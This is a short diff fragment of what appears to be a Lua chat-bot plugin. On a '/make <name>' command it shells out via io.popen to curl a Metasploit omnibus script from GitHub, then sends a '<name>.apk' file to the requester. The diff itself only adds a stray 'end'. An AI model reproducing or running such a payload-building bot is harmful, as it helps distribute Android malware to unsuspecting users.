@@ -4,6 +4,7 @@ text = io.popen(" curl https://raw.githubusercontent.com/rapid7/metasploit-omnib
 	 send_document(get_receiver(msg), "./"..matches[2]..".apk", ok_cb, false)
   return text
 end
+end
 return {
   patterns = {
   '^[#/!]make (.*)$'
